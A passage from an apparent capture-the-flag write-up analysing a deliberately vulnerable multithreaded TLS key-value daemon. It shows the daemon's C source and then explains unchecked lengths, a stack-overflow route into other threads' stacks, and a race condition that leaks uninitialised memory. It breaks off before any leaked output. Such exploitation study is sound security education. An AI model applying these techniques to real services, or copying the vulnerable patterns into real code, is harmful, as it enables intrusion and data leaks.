+<span class="cp">&quot;</span><span class="c1">// f &lt;key&gt; - find entry and see if it exists\n&quot; \</span>
+<span class="s">&quot;// s &lt;key&gt; &lt;bytes&gt; - store an entry with key and &lt;bytes&gt; lenght of data</span><span class="se">\n</span><span class="s">&quot;</span><span class="w"> </span>\
+<span class="s">&quot;// g &lt;key&gt; - read data from key</span><span class="se">\n</span><span class="s">&quot;</span><span class="w"> </span>\
+<span class="s">&quot;// d &lt;key&gt; - delete key/data</span><span class="se">\n</span><span class="s">&quot;</span><span class="w"> </span>\
+<span class="s">&quot;// X - delete all data and restart</span><span class="se">\n</span><span class="s">&quot;</span><span class="w"> </span>
+<span class="c1">// XXX, loop over HXmap and display data? </span>
+
+<span class="w">        </span><span class="n">gnutls_record_send</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">HELP</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">HELP</span><span class="p">));</span>
+<span class="w">        </span><span class="k">break</span><span class="p">;</span>
+<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;d&#39;</span><span class="p">:</span>
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">gnutls_record_send</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">NOKEY</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">NOKEY</span><span class="p">));</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="p">;</span>
+
+<span class="w">          </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HXmap_del</span><span class="p">(</span><span class="n">dict</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="w">          </span><span class="k">if</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">gnutls_record_send</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">KEYFOUND</span><span class="p">,</span><span class="w"> </span>
+<span class="w">              </span><span class="n">strlen</span><span class="p">(</span><span class="n">KEYFOUND</span><span class="p">));</span>
+<span class="w">          </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">gnutls_record_send</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">NOTFOUND</span><span class="p">,</span>
+<span class="w">              </span><span class="n">strlen</span><span class="p">(</span><span class="n">NOTFOUND</span><span class="p">));</span>
+<span class="w">          </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">break</span><span class="p">;</span>
+<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;s&#39;</span><span class="p">:</span><span class="w"> </span><span class="c1">// set</span>
+<span class="w">        </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">gather_data</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="n">atoi</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">2</span><span class="p">]));</span>
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">data</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="cp">#define NEWKEY &quot;</span><span class="c1">// New key added!\n&quot;</span>
+<span class="w">          </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;args[1] = %08x/%s, data = %08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span>
+<span class="w">            </span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="n">data</span><span class="p">);</span>
+<span class="w">          </span><span class="n">HXmap_add</span><span class="p">(</span><span class="n">dict</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="n">data</span><span class="p">);</span>
+<span class="w">          </span><span class="n">gnutls_record_send</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">NEWKEY</span><span class="p">,</span><span class="w"> </span>
+<span class="w">            </span><span class="n">strlen</span><span class="p">(</span><span class="n">NEWKEY</span><span class="p">));</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="cp">#define ADDERROR &quot;</span><span class="c1">// Unable to add new entry, problem getting data\n&quot;</span>
+<span class="w">          </span><span class="n">gnutls_record_send</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">ADDERROR</span><span class="p">,</span><span class="w"> </span>
+<span class="w">            </span><span class="n">strlen</span><span class="p">(</span><span class="n">ADDERROR</span><span class="p">));</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">break</span><span class="p">;</span>
+<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;u&#39;</span><span class="p">:</span><span class="w"> </span><span class="c1">// update</span>
+<span class="w">        </span><span class="n">update_data</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="n">atoi</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">2</span><span class="p">]));</span>
+<span class="w">        </span><span class="k">break</span><span class="p">;</span>
+<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;f&#39;</span><span class="p">:</span><span class="w"> </span><span class="c1">// find</span>
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">gnutls_record_send</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">NOKEY</span><span class="p">,</span><span class="w"> </span>
+<span class="w">            </span><span class="n">strlen</span><span class="p">(</span><span class="n">NOKEY</span><span class="p">));</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="k">if</span><span class="p">(</span><span class="n">HXmap_find</span><span class="p">(</span><span class="n">dict</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">gnutls_record_send</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span>
+<span class="w">            </span><span class="n">NOTFOUND</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">NOTFOUND</span><span class="p">));</span>
+<span class="w">          </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">gnutls_record_send</span><span class="p">(</span><span class="n">session</span><span class="p">,</span>
+<span class="w">            </span><span class="n">KEYFOUND</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">KEYFOUND</span><span class="p">));</span>
+<span class="w">          </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+
+<span class="w">        </span><span class="k">break</span><span class="p">;</span>
+
+<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;g&#39;</span><span class="p">:</span><span class="w"> </span><span class="c1">// get</span>
+<span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="n">gnutls_record_send</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">NOKEY</span><span class="p">,</span><span class="w"> </span>
+<span class="w">            </span><span class="n">strlen</span><span class="p">(</span><span class="n">NOKEY</span><span class="p">));</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">          </span><span class="k">if</span><span class="p">((</span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">HXmap_get</span><span class="p">(</span><span class="n">dict</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span><span class="w"> </span>
+<span class="w">            </span><span class="o">==</span><span class="w"> </span><span class="nb">NULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">gnutls_record_send</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">NOTFOUND</span><span class="p">,</span>
+<span class="w">            </span><span class="n">strlen</span><span class="p">(</span><span class="n">NOTFOUND</span><span class="p">));</span>
+<span class="w">          </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="n">send_data</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="n">data</span><span class="p">);</span>
+<span class="w">          </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">break</span><span class="p">;</span>
+<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;e&#39;</span><span class="p">:</span>
+<span class="w">        </span><span class="n">cont</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">        </span><span class="k">break</span><span class="p">;</span>
+<span class="w">      </span><span class="k">case</span><span class="w"> </span><span class="sc">&#39;X&#39;</span><span class="p">:</span>
+<span class="w">        </span><span class="n">new_dict</span><span class="p">();</span>
+<span class="cp">#define NEWDICT &quot;</span><span class="c1">// New dictionary installed\n&quot;</span>
+<span class="w">        </span><span class="n">gnutls_record_send</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">NEWDICT</span><span class="p">,</span>
+<span class="w">        </span><span class="n">strlen</span><span class="p">(</span><span class="n">NEWDICT</span><span class="p">));</span>
+<span class="w">        </span><span class="k">break</span><span class="p">;</span>
+<span class="w">      </span><span class="k">default</span><span class="o">:</span>
+<span class="cp">#define UC &quot;</span><span class="c1">// Unknown Command, please see &#39;h&#39; for help information\n&quot;</span>
+
+<span class="w">        </span><span class="n">gnutls_record_send</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">UC</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">UC</span><span class="p">));</span>
+<span class="w">        </span><span class="k">break</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">  </span><span class="p">}</span>
+
+
+<span class="cp">#define GB &quot;</span><span class="c1">// Good bye!\n&quot;</span>
+<span class="w">  </span><span class="n">gnutls_record_send</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">GB</span><span class="p">,</span><span class="w"> </span><span class="n">strlen</span><span class="p">(</span><span class="n">GB</span><span class="p">));</span>
+<span class="w">  </span><span class="n">gnutls_bye</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">GNUTLS_SHUT_WR</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+<span class="w">  </span><span class="n">gnutls_deinit</span><span class="p">(</span><span class="n">session</span><span class="p">);</span>
+
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cp">#define DH_BITS 512</span>
+
+<span class="k">static</span><span class="w"> </span><span class="n">gnutls_dh_params_t</span><span class="w"> </span><span class="n">dh_params</span><span class="p">;</span>
+
+<span class="k">static</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">generate_dh_params</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="cm">/* </span>
+<span class="cm">   * Generate Diffie-Hellman parameters - for use with DHE</span>
+<span class="cm">   * kx algorithms. When short bit length is used, it might</span>
+<span class="cm">   * be wise to regenerate parameters.</span>
+<span class="cm">   *</span>
+<span class="cm">   */</span>
+<span class="w">  </span><span class="n">gnutls_dh_params_init</span><span class="w"> </span><span class="p">(</span><span class="o">&amp;</span><span class="n">dh_params</span><span class="p">);</span>
+<span class="w">  </span><span class="n">gnutls_dh_params_generate2</span><span class="w"> </span><span class="p">(</span><span class="n">dh_params</span><span class="p">,</span><span class="w"> </span><span class="n">DH_BITS</span><span class="p">);</span>
+
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">GCRY_THREAD_OPTION_PTHREAD_IMPL</span><span class="p">;</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span>
+<span class="p">{</span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">fd</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">;</span>
+
+<span class="w">  </span><span class="n">HX_init</span><span class="p">();</span>
+
+<span class="w">  </span><span class="n">gcry_control</span><span class="p">(</span><span class="n">GCRYCTL_SET_THREAD_CBS</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">gcry_threads_pthread</span><span class="p">);</span>
+<span class="w">  </span><span class="n">gnutls_global_init</span><span class="p">();</span>
+
+<span class="w">  </span><span class="n">gnutls_certificate_allocate_credentials</span><span class="w"> </span><span class="p">(</span><span class="o">&amp;</span><span class="n">x509_cred</span><span class="p">);</span>
+<span class="w">  </span><span class="n">gnutls_certificate_set_x509_trust_file</span><span class="w"> </span><span class="p">(</span><span class="n">x509_cred</span><span class="p">,</span><span class="w"> </span><span class="n">CAFILE</span><span class="p">,</span>
+<span class="w">            </span><span class="n">GNUTLS_X509_FMT_PEM</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">gnutls_certificate_set_x509_crl_file</span><span class="w"> </span><span class="p">(</span><span class="n">x509_cred</span><span class="p">,</span><span class="w"> </span><span class="n">CRLFILE</span><span class="p">,</span>
+<span class="w">            </span><span class="n">GNUTLS_X509_FMT_PEM</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">gnutls_certificate_set_x509_key_file</span><span class="w"> </span><span class="p">(</span><span class="n">x509_cred</span><span class="p">,</span><span class="w"> </span><span class="n">CERTFILE</span><span class="p">,</span><span class="w"> </span><span class="n">KEYFILE</span><span class="p">,</span>
+<span class="w">          </span><span class="n">GNUTLS_X509_FMT_PEM</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">generate_dh_params</span><span class="w"> </span><span class="p">();</span>
+
+<span class="w">  </span><span class="n">gnutls_priority_init</span><span class="w"> </span><span class="p">(</span><span class="o">&amp;</span><span class="n">priority_cache</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;NORMAL&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+<span class="w">  </span><span class="n">gnutls_certificate_set_dh_params</span><span class="w"> </span><span class="p">(</span><span class="n">x509_cred</span><span class="p">,</span><span class="w"> </span><span class="n">dh_params</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">new_dict</span><span class="p">();</span>
+
+<span class="w">  </span><span class="n">signal</span><span class="p">(</span><span class="n">SIGPIPE</span><span class="p">,</span><span class="w"> </span><span class="n">SIG_IGN</span><span class="p">);</span>
+
+<span class="w">  </span><span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span><span class="w"> </span><span class="n">UID</span><span class="p">,</span><span class="w"> </span><span class="n">GID</span><span class="p">);</span><span class="w">  </span>
+<span class="w">  </span><span class="n">serve_forever_threaded</span><span class="p">(</span><span class="n">PORT</span><span class="p">,</span><span class="w"> </span><span class="n">keyval_thread</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<h2>static analysis</h2>
+<ul>
+<li>i will put a lot of detail of time in this , as they say , time spent on recon is rarely wasted , and I have learned this truth the hard way on my previous attempt with this challenge .</li>
+<li>my usual strategy , start in main and follow the execution chain .</li>
+<li>before that we note that the dictionary declared in the line</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="k">struct</span><span class="w"> </span><span class="nc">HXmap</span><span class="w"> </span><span class="n">dict</span><span class="p">;</span>
+</code></pre></div>
+
+<p>is the only global variable in the code , that mean that probably any data corruption done with a multithreded approach is bound to happen though that dictionary.
+- we also note a possibility of corrupting the length of a data in the <code>data</code> struct declared in the code :</p>
+<div class="codehilite"><pre><span></span><code><span class="k">struct</span><span class="w"> </span><span class="nc">data</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">data</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">size_t</span><span class="w"> </span><span class="n">length</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div>
+
+<p>since the data is contiguous , and leaking the length will allow a leak if some data printing function exists and depends on the length field , we'll leave this possibility in here.
+- the first function from our code is <code>new_dict</code> which seems too free the global dictionary if one is allocated , zero its memory and set its freeing function to <code>free_data</code> allocate a new one .
+- analysing <code>free_data</code> , it seems simple , it takes a pointer to a data structure , frees its <code>data</code> field if it isn't null , and free the data struct pointer itself, it will free the struct anyway , we could have a UAF here.
+- returning to main we know tha the program will ignore <code>SIGPIPE</code> , then we can jump to the line that starts a <code>keyval_thread</code> thread for each instance , here is where it gets meaty.
+- now for the analysis of <code>keyval_thread</code> , the function and by extension the thread gets a file descriptor as argument and starts by doing a <code>gnutls</code> handshake , if it fails the program closes the <code>fd</code> and then tries to write an error to it ??? suspicious .
+- anyway , after that we have an infinite loop , the notable things are that it allocates a buffer <code>buf</code> in the stack that we give input into ,it splits it to six arguments , the first (accurately , the first character of the first) is put into a switch statement and it decides the operation that will be done , we got this little menu of what we can do :</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">#define HELP \</span>
+<span class="cp">&quot;</span><span class="c1">// f &lt;key&gt; - find entry and see if it exists\n&quot; \</span>
+<span class="s">&quot;// s &lt;key&gt; &lt;bytes&gt; - store an entry with key and &lt;bytes&gt; lenght of data</span><span class="se">\n</span><span class="s">&quot;</span><span class="w"> </span>\
+<span class="s">&quot;// g &lt;key&gt; - read data from key</span><span class="se">\n</span><span class="s">&quot;</span><span class="w"> </span>\
+<span class="s">&quot;// d &lt;key&gt; - delete key/data</span><span class="se">\n</span><span class="s">&quot;</span><span class="w"> </span>\
+<span class="s">&quot;// X - delete all data and restart</span><span class="se">\n</span><span class="s">&quot;</span><span class="w"> </span>
+</code></pre></div>
+
+<ul>
+<li>we have a function that displays data , one that sets it and one that deletes it , another to reset the entire shared dict , this is good stuff , since as far as I can see no locks are there to prevent simultaneous operations by threads (on the same dictionary !!!).</li>
+<li>now let's go for each operation's switch case's code :<ul>
+<li>d : checks if argument with index 1 exists , if not exit  , if yes pass it to a delete function in the HX library , although not much checking is done on the data , i don't suspect anything could be done here specifically  .</li>
+<li>s : as the menu says this sets an entry with a key and length ,and jackpot ! , then length is not sanity checked ! , moreover the function collects data of the said length using the <code>gather_data</code> function , so let's check that .<ul>
+<li>the function <code>gather_data</code> allocates a buffer in the stack with whatever length we give it , variable length array , honestly i already found this on my first try , in short , we can allocate chunks so big and make the stack (and by extension our writing point) go so low that we write directly (and without overwrite ) in the stack of other threads , potentially hijacking they execution flow (plot twists : I already did it , it's possible , but that's only the first part of the problem)</li>
+<li>moreover , we have an opportunity for head spraying here , as the function allocates a data struct gives a copy of the data to it by duplicating it with function <code>HX_memdup</code>  , which without doubt uses the head like the classic <code>memdup</code>.</li>
+<li>the rest of the function along with the code block for the s option have nothing suspicious it seems , what we have is good already !</li>
+</ul>
+</li>
+<li>u : same unchecked length issue in the s option , the <code>update_data</code> function is similar to the <code>gather_data</code>  , same data reading mechanism , but here if the length provided is larger than the one in the data struct being modifies ,a realloc is performed , the weird thing is that the length in the structure isn't modified until the end of the function ? , more notably , the actual modification of the data happens before that , could we have a chance of inducing mismatched data/length here ? interesting . </li>
+<li>f : seems simple , checks if a key exists , nothing suspicious.</li>
+<li>g : if a key is found this calls the <code>send_data</code> function , which has a sending style similar to the way <code>gather_data</code> and <code>update_data</code> receive data , I guess the <code>gnutls</code> functions used i transmission and reception here have a hard limit of 65535 , thus the funny code .</li>
+</ul>
+</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="k">for</span><span class="p">(</span><span class="n">offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">length</span><span class="p">;</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">gnutls_record_recv</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">buffer</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">offset</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span>
+<span class="w">      </span><span class="n">offset</span><span class="p">)</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mi">65535</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="mi">65535</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="p">(</span><span class="n">length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">offset</span><span class="p">));</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">ret</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="nb">NULL</span><span class="p">;</span>
+<span class="w">    </span><span class="n">offset</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">ret</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+</code></pre></div>
+
+<ul>
+<li>e : exit , obvio</li>
+<li>x : deletes dict and makes a new one , might be interesting in race conditions.</li>
+</ul>
+<h2>Dynamic analysis and funny things at runtime</h2>
+<ul>
+<li>let's boot up the VM and examine this for ourselves !</li>
+<li>connecting to the VM on the challenge port using a <code>gnutls</code> hack, and trying the different features of the <code>keyval_thread</code> function , everything works just fine :</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="c1">// Welcome to KeyValDaemon. Type &#39;h&#39; for help information</span>
+$<span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="n">t</span><span class="w"> </span><span class="mi">4</span>
+$<span class="w"> </span><span class="n">dddd</span>
+<span class="c1">// New key added!</span>
+<span class="c1">// Unknown Command, please see &#39;h&#39; for help information</span>
+$<span class="w"> </span><span class="n">g</span><span class="w"> </span><span class="n">t</span>
+<span class="c1">// Sending 4 bytes</span>
+<span class="n">dddd</span>$<span class="w"> </span><span class="n">u</span><span class="w"> </span><span class="n">t</span><span class="w"> </span><span class="mi">4</span>
+$<span class="w"> </span><span class="n">gggg</span>
+<span class="c1">// Updated successfully</span>
+<span class="c1">// Unknown Command, please see &#39;h&#39; for help information</span>
+$<span class="w"> </span><span class="n">g</span><span class="w"> </span><span class="n">t</span>
+<span class="c1">// Sending 4 bytes</span>
+<span class="n">gggg</span>$<span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="n">t</span>
+<span class="c1">// Key exists</span>
+$<span class="w"> </span><span class="n">X</span>
+<span class="c1">// New dictionary installed</span>
+$<span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="n">t</span>
+<span class="c1">// Key was not found</span>
+$<span class="w"> </span><span class="n">g</span><span class="w"> </span><span class="n">t</span>
+<span class="c1">// Key was not found</span>
+$<span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="n">t</span><span class="w"> </span><span class="mi">4</span>
+$<span class="w"> </span><span class="n">dddd</span>
+<span class="c1">// New key added!</span>
+<span class="c1">// Unknown Command, please see &#39;h&#39; for help information</span>
+$<span class="w"> </span><span class="n">d</span><span class="w"> </span><span class="n">t</span>
+<span class="c1">// Key exists</span>
+$<span class="w"> </span><span class="n">f</span><span class="w"> </span><span class="n">t</span>
+<span class="c1">// Key was not found</span>
+$<span class="w"> </span><span class="n">e</span>
+<span class="c1">// Good bye!</span>
+</code></pre></div>
+
+<ul>
+<li>before attacking the UAL stack overflow(overrun?) , it might be interesting to see what we can do with the total lack of data locking/simultaneous operations between threads , I hope to get some kind of leak  , </li>
+<li>we can stop the program  in two places , those are where it waits for data , the point is while the program is waiting for input it assumes data integrity , let's see if we can violate that assumption and turn in to our advantage. before that however , for facility I will make some helper functions so I can set/update/delete... with function calls in my script .</li>
+<li>after havig done that , i realized that the <code>gather_data</code> function stores the user input in a buffer and only puts it into data structure along with the length at the end , so I guess we're left with <code>update_data</code> as the target , which modifies <code>data-&gt;data</code> directly in the line :</li>
+</ul>
+<div class="codehilite"><pre><span></span><code><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">gnutls_record_send</span><span class="p">(</span><span class="n">session</span><span class="p">,</span><span class="w"> </span><span class="n">data</span><span class="o">-&gt;</span><span class="n">data</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">offset</span><span class="p">,</span>
+<span class="w">       </span><span class="n">tosend</span><span class="p">);</span>
+</code></pre></div>
+
+<h2>THE LEAK</h2>
+<ul>
+<li>the goal here is to have a <code>data</code> structure to have mismatched fields , so that the <code>data-&gt;length</code> field is actually larger than the size of data in <code>data-&gt;data</code> , that so we can do a <code>get</code> operation and  <strong>read uninitialized data</strong>.</li>
+<li>to get a leak , we will exploit the fact the <code>update_data</code> function doesn't modify the length field of the data struct until the end of the function , the idea is to set up a key/data pair with a small length using <code>s</code> functionality  let's say key <code>A</code> with length <code>1</code>.</li>
+<li>data is now : </li>
+<li>then we update it with the <code>u</code> one to a greater size lets say 1500 ,so we trigger <code>realloc</code> and get a new <code>data</code> buffer ,but we only send a part of the update input , let's say 1400 bytes , and let the function waiting for the rest of the data , hanging there while we do other stuff , at this stage , the actual <code>data</code> field is our newly send one , but he length  won't be set to the new one we specified until we send the remaining data , so we still have a length of 1 .</li>
+<li>data is now :</li>
+<li>now  while the second thread is waiting for data completion ,from another third thread we do the same thing we did with the second thread , but we keep the length less than the one we specified with the second thread , and this time we send the whole data and complete the update , all the while the second thread is still waiting for its remaining 50 bytes . </li>
+<li>data is now :</li>
+<li>and finally we send the 50 bytes in the second thread , that will set the length field to 1400 , but the <code>data-&gt;data</code> pointer in the data structure actually points to the buffer set up by the third thread's update , and bingoo , we have a mismatch , a <code>data-&gt;data</code> of 1400 bytes of actual input , and a <code>data-&gt;length</code> that is 1500! </li>
+<li>now a  <code>g A</code> operation yields :
